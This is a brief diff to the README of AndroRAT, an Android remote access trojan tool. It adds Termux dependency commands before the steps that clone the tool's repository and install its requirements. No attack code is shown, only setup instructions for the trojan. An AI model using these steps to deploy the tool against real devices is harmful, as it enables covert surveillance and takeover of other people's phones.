@@ -30,6 +30,10 @@ AndroRAT requires Python3 and JAVA (or Android Studio)
 
 ## Installation
 ```
+pkg update && pkg upgrade
+pkg install openjdk-17
+apt-get install zipalign
+pkg install aapt
 git clone https://github.com/karma9874/AndroRAT.git
 cd AndroRAT
 pip install -r requirements.txt
